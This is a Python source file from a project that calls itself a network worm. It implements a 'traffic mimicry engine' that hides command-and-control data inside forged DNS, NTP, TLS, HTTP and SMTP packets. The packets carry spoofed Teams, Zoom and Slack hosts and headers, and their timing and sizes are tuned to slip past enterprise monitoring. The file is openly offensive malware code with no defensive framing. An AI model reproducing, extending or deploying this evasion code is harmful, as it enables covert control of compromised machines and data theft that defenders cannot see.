"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Traffic Mimicry Engine
Encapsulates C2 traffic inside legitimate-looking protocol traffic.

Instead of just changing file signatures, this engine makes the NETWORK
traffic look like normal enterprise traffic:
- Microsoft Teams-like packets
- Zoom-like video traffic
- HTTP/HTTPS browsing traffic
- DNS queries
- NTP synchronization
"""

import os
import random
import struct
import sys
import time
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class TrafficMimicryEngine:
    """
    Traffic Mimicry Engine

    Transforms C2 traffic to look like legitimate enterprise protocols.
    """

    # Protocol templates with realistic packet structures
    PROTOCOL_TEMPLATES = {
        "teams": {
            "ports": [443, 3478, 3479, 3480, 3481],
            "packet_sizes": (200, 1500),
            "interval": (0.5, 5.0),
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SkypeTeams/1.0",
                "Content-Type": "application/octet-stream",
            },
            "signature": b"\x17\x03\x03",  # TLS 1.2
        },
        "zoom": {
            "ports": [443, 8801, 8802],
            "packet_sizes": (500, 1400),
            "interval": (0.1, 0.5),  # Video-like frequency
            "headers": {
                "User-Agent": "ZoomSDK/5.0",
                "Content-Type": "application/zoom",
            },
            "signature": b"\x5a\x4d",  # ZM magic bytes
        },
        "dns": {
            "ports": [53],
            "packet_sizes": (40, 512),
            "interval": (1.0, 30.0),
            "headers": {},
            "signature": None,
        },
        "http_browsing": {
            "ports": [80, 443],
            "packet_sizes": (100, 8000),
            "interval": (0.2, 3.0),
            "headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
            },
            "signature": b"GET /",
        },
        "ntp": {
            "ports": [123],
            "packet_sizes": (48, 48),
            "interval": (60.0, 300.0),
            "headers": {},
            "signature": b"\x1b",  # NTP version 3
        },
        "smtp": {
            "ports": [25, 587, 465],
            "packet_sizes": (50, 2000),
            "interval": (5.0, 60.0),
            "headers": {},
            "signature": b"EHLO",
        },
    }

    def __init__(self):
        self.active_protocol = None
        self.traffic_stats: Dict[str, int] = defaultdict(int)
        self.detection_events = 0

    def select_protocol(self, network_profile: Dict = None) -> str:
        """
        Select the best protocol to mimic based on network profile

        Args:
            network_profile: Dict with observed traffic patterns
                           e.g., {'teams': 0.4, 'zoom': 0.3, 'http': 0.2, 'dns': 0.1}

        Returns:
            Selected protocol name
        """
        if network_profile:
            # Weighted selection based on observed traffic
            protocols = list(network_profile.keys())
            weights = list(network_profile.values())
            total = sum(weights)
            weights = [w / total for w in weights]
            selected = random.choices(protocols, weights=weights, k=1)[0]
        else:
            # Default: pick most common enterprise protocols
            protocols = list(self.PROTOCOL_TEMPLATES.keys())
            selected = random.choice(protocols)

        self.active_protocol = selected
        logger.debug(f"Traffic mimicry: using {selected} protocol")
        return selected

    def encapsulate_data(self, data: bytes, protocol: str = None) -> bytes:
        """
        Encapsulate C2 data inside a legitimate-looking packet

        Args:
            data: Raw C2 data to encapsulate
            protocol: Protocol to mimic

        Returns:
            Encapsulated packet that looks like legitimate traffic
        """
        protocol = protocol or self.active_protocol or "http_browsing"
        template = self.PROTOCOL_TEMPLATES.get(protocol, self.PROTOCOL_TEMPLATES["http_browsing"])

        if protocol == "dns":
            return self._encapsulate_dns(data)
        elif protocol == "ntp":
            return self._encapsulate_ntp(data)
        elif protocol in ("teams", "zoom"):
            return self._encapsulate_tls(data, template)
        elif protocol == "http_browsing":
            return self._encapsulate_http(data, template)
        elif protocol == "smtp":
            return self._encapsulate_smtp(data)
        else:
            return self._encapsulate_http(data, template)

    def _encapsulate_dns(self, data: bytes) -> bytes:
        """Encapsulate data in DNS query format"""
        # DNS header: transaction ID, flags, questions, answers, etc.
        txn_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query, recursion desired
        questions = 1
        answers = 0
        authority = 0
        additional = 0

        header = struct.pack(">HHHHHH", txn_id, flags, questions, answers, authority, additional)

        # Encode data as DNS name (base32-like encoding)
        encoded = "".join(chr(97 + (b % 26)) for b in data[:60])  # a-z only
        chunks = [encoded[i : i + 63] for i in range(0, len(encoded), 63)]

        question = b""
        for chunk in chunks:
            question += bytes([len(chunk)]) + chunk.encode()
        question += b"\x00"  # End of name
        question += struct.pack(">HH", 16, 1)  # TXT record, IN class

        return header + question

    def _encapsulate_ntp(self, data: bytes) -> bytes:
        """Encapsulate data in NTP packet format"""
        # NTP header: LI, VN, Mode, Stratum, Poll, Precision
        li_vn_mode = 0x1B  # Leap=0, Version=3, Mode=3 (client)
        stratum = random.randint(1, 16)
        poll = random.randint(4, 10)
        precision = -6

        header = struct.pack(">BBBB", li_vn_mode, stratum, poll, precision)

        # Root delay, root dispersion, reference ID
        header += struct.pack(">II", random.randint(0, 2**32), random.randint(0, 2**32))
        header += struct.pack(">I", random.randint(0, 2**32))

        # Timestamps (64-bit each)
        for _ in range(4):
            header += struct.pack(
                ">II",
                int(time.time()) + random.randint(-10, 10),
                random.randint(0, 2**32),
            )

        # Append encrypted data as "extension"
        if data:
            header += data[:48]  # NTP extensions

        return header

    def _encapsulate_tls(self, data: bytes, template: Dict) -> bytes:
        """Encapsulate data in TLS-like format"""
        # TLS record header: Content Type, Version, Length
        content_type = 0x17  # Application Data
        version = 0x0303  # TLS 1.2
        length = min(len(data), 16384)

        header = struct.pack(">BHH", content_type, version, length)

        # Fake TLS record number (monotonically increasing)
        record_num = random.randint(0, 2**48)
        header += struct.pack(">Q", record_num)[:6]

        # XOR data with random key (simulating encryption)
        key = bytes([random.randint(0, 255) for _ in range(16)])
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(data[:length]))

        return header + encrypted

    def _encapsulate_http(self, data: bytes, template: Dict) -> bytes:
        """Encapsulate data in HTTP request format"""
        import base64

        # HTTP POST request
        path = random.choice(
            [
                "/api/v1/sync",
                "/api/v2/update",
                "/api/v3/health",
                "/api/v1/metrics",
                "/api/v2/config",
                "/api/v1/status",
            ]
        )

        encoded_data = base64.b64encode(data[:1000]).decode()

        headers = "\r\n".join(f"{k}: {v}" for k, v in template["headers"].items())

        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {random.choice(['teams.microsoft.com', 'zoom.us', 'api.slack.com'])}\r\n"
            f"{headers}\r\n"
            f"Content-Length: {len(encoded_data)}\r\n"
            f"\r\n"
            f"{encoded_data}"
        )

        return request.encode()

    def _encapsulate_smtp(self, data: bytes) -> bytes:
        """Encapsulate data in SMTP format"""
        import base64

        sender = f"noreply@{random.choice(['company.com', 'corp.net', 'enterprise.org'])}"
        recipient = f"admin@{random.choice(['company.com', 'corp.net', 'enterprise.org'])}"

        encoded_data = base64.b64encode(data[:500]).decode()

        message = (
            f"EHLO mail.company.com\r\n"
            f"MAIL FROM:<{sender}>\r\n"
            f"RCPT TO:<{recipient}>\r\n"
            f"DATA\r\n"
            f"From: {sender}\r\n"
            f"To: {recipient}\r\n"
            f"Subject: Daily Report\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Transfer-Encoding: base64\r\n"
            f"\r\n"
            f"{encoded_data}\r\n"
            f".\r\n"
        )

        return message.encode()

    def get_timing(self, protocol: str = None) -> float:
        """Get realistic timing interval for a protocol"""
        protocol = protocol or self.active_protocol or "http_browsing"
        template = self.PROTOCOL_TEMPLATES.get(protocol, self.PROTOCOL_TEMPLATES["http_browsing"])
        min_interval, max_interval = template["interval"]
        return random.uniform(min_interval, max_interval)

    def get_packet_size(self, protocol: str = None) -> Tuple[int, int]:
        """Get realistic packet size range for a protocol"""
        protocol = protocol or self.active_protocol or "http_browsing"
        template = self.PROTOCOL_TEMPLATES.get(protocol, self.PROTOCOL_TEMPLATES["http_browsing"])
        min_size, max_size = template["packet_sizes"]
        return (min_size, max_size)

    def get_statistics(self) -> Dict:
        """Get traffic mimicry statistics"""
        return {
            "active_protocol": self.active_protocol,
            "traffic_stats": dict(self.traffic_stats),
            "detection_events": self.detection_events,
        }
